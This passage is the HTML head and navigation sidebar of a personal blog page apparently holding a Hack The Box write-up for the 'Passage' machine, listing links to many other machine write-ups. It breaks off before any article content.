<!doctype html><html lang=en><head><title>[HTB] Machine: Passage</title>
<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/passage/"><meta property="og:site_name" content="Personal Blog"><meta property="og:title" content="[HTB] Machine: Passage"><meta property="og:description" content="[HTB] Machine: Passage"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-28T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-28T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Cutenews"><meta property="article:tag" content="Webshell"><meta property="article:tag" content="Upload"><meta property="article:tag" content="Searchsploit"><meta property="article:tag" content="Source-Code"><meta name=description content="[HTB] Machine: Passage"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
<span class=navbar-toggler-icon></span>
</button>
<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
Personal Blog</a>
<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ai/ title="[HTB] Machine: AI">[HTB] Machine: AI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/ title="[HTB] Machine: Apocalyst">[HTB] Machine: Apocalyst</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/aragog/ title="[HTB] Machine: Aragog">[HTB] Machine: Aragog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backend/ title="[HTB] Machine: Backend">[HTB] Machine: Backend</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backendtwo/ title="[HTB] Machine: BackendTwo">[HTB] Machine: BackendTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bitlab/ title="[HTB] Machine: Bitlab">[HTB] Machine: Bitlab</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/book/ title="[HTB] Machine: Book">[HTB] Machine: Book</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/broscience/ title="[HTB] Machine: BroScience">[HTB] Machine: BroScience</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bucket/ title="[HTB] Machine: Bucket">[HTB] Machine: Bucket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cache/ title="[HTB] Machine: Cache">[HTB] Machine: Cache</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/canape/ title="[HTB] Machine: Canape">[HTB] Machine: Canape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/carrier/ title="[HTB] Machine: Carrier">[HTB] Machine: Carrier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/celestial/ title="[HTB] Machine: Celestial">[HTB] Machine: Celestial</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/chaos/ title="[HTB] Machine: Chaos">[HTB] Machine: Chaos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/craft/ title="[HTB] Machine: Craft">[HTB] Machine: Craft</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devoops/ title="[HTB] Machine: DevOops">[HTB] Machine: DevOops</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devzat/ title="[HTB] Machine: Devzat">[HTB] Machine: Devzat</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/dynstr/ title="[HTB] Machine: Dynstr">[HTB] Machine: Dynstr</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/enterprise/ title="[HTB] Machine: Enterprise">[HTB] Machine: Enterprise</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/europa/ title="[HTB] Machine: Europa">[HTB] Machine: Europa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/format/ title="[HTB] Machine: Format">[HTB] Machine: Format</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/ title="[HTB] Machine: Fulcrum">[HTB] Machine: Fulcrum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/gobox/ title="[HTB] Machine: Gobox">[HTB] Machine: Gobox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haircut/ title="[HTB] Machine: Haircut">[HTB] Machine: Haircut</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/hawk/ title="[HTB] Machine: Hawk">[HTB] Machine: Hawk</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/health/ title="[HTB] Machine: Health">[HTB] Machine: Health</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inception/ title="[HTB] Machine: Inception">[HTB] Machine: Inception</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jarvis/ title="[HTB] Machine: Jarvis">[HTB] Machine: Jarvis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jewel/ title="[HTB] Machine: Jewel">[HTB] Machine: Jewel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lazy/ title="[HTB] Machine: Lazy">[HTB] Machine: Lazy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/magic/ title="[HTB] Machine: Magic">[HTB] Machine: Magic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mango/ title="[HTB] Machine: Mango">[HTB] Machine: Mango</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mentor/ title="[HTB] Machine: Mentor">[HTB] Machine: Mentor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nineveh/ title="[HTB] Machine: Nineveh">[HTB] Machine: Nineveh</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/node/ title="[HTB] Machine: Node">[HTB] Machine: Node</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/noter/ title="[HTB] Machine: Noter">[HTB] Machine: Noter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/obscurity/ title="[HTB] Machine: Obscurity">[HTB] Machine: Obscurity</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/olympus/ title="[HTB] Machine: Olympus">[HTB] Machine: Olympus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/ title="[HTB] Machine: Ophiuchi">[HTB] Machine: Ophiuchi</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/passage/ title="[HTB] Machine: Passage">[HTB] Machine: Passage</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pc/ title="[HTB] Machine: PC">[HTB] Machine: PC</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pit/ title="[HTB] Machine: Pit">[HTB] Machine: Pit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ready/ title="[HTB] Machine: Ready">[HTB] Machine: Ready</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redcross/ title="[HTB] Machine: RedCross">[HTB] Machine: RedCross</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/schooled/ title="[HTB] Machine: Schooled">[HTB] Machine: Schooled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/seal/ title="[HTB] Machine: Seal">[HTB] Machine: Seal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shibboleth/ title="[HTB] Machine: Shibboleth">[HTB] Machine: Shibboleth</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneaky/ title="[HTB] Machine: Sneaky">[HTB] Machine: Sneaky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/ title="[HTB] Machine: SneakyMailer">[HTB] Machine: SneakyMailer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/solidstate/ title="[HTB] Machine: SolidState">[HTB] Machine: SolidState</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stratosphere/ title="[HTB] Machine: Stratosphere">[HTB] Machine: Stratosphere</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/ title="[HTB] Machine: TartarSauce">[HTB] Machine: TartarSauce</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenet/ title="[HTB] Machine: Tenet">[HTB] Machine: Tenet</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tentacle/ title="[HTB] Machine: Tentacle">[HTB] Machine: Tentacle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/thenotebook/ title="[HTB] Machine: TheNotebook">[HTB] Machine: TheNotebook</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/time/ title="[HTB] Machine: Time">[HTB] Machine: Time</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unattended/ title="[HTB] Machine: Unattended">[HTB] Machine: Unattended</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unicode/ title="[HTB] Machine: Unicode">[HTB] Machine: Unicode</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/union/ title="[HTB] Machine: Union">[HTB] Machine: Union</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/updown/ title="[HTB] Machine: Updown">[HTB] Machine: Updown</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/vault/ title="[HTB] Machine: Vault">[HTB] Machine: Vault</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/waldo/ title="[HTB] Machine: Waldo">[HTB] Machine: Waldo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/wall/ title="[HTB] Machine: Wall">[HTB] Machine: Wall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writer/ title="[HTB] Machine: Writer">[HTB] Machine: Writer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ypuffy/ title="[HTB] Machine: Ypuffy">[HTB] Machine: Ypuffy</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/windows/absolute/ title="[HTB] Machine: Absolute">[HTB] Machine: Absolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/acute/ title="[HTB] Machine: Acute">[HTB] Machine: Acute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/anubis/ title="[HTB] Machine: Anubis">[HTB] Machine: Anubis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/apt/ title="[HTB] Machine: APT">[HTB] Machine: APT</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bankrobber/ title="[HTB] Machine: BankRobber">[HTB] Machine: BankRobber</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cerberus/ title="[HTB] Machine: Cerberus">[HTB] Machine: Cerberus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/control/ title="[HTB] Machine: Control">[HTB] Machine: Control</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/hathor/ title="[HTB] Machine: Hathor">[HTB] Machine: Hathor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/json/ title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/multimaster/ title="[HTB] Machine: Multimaster">[HTB] Machine: Multimaster</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a 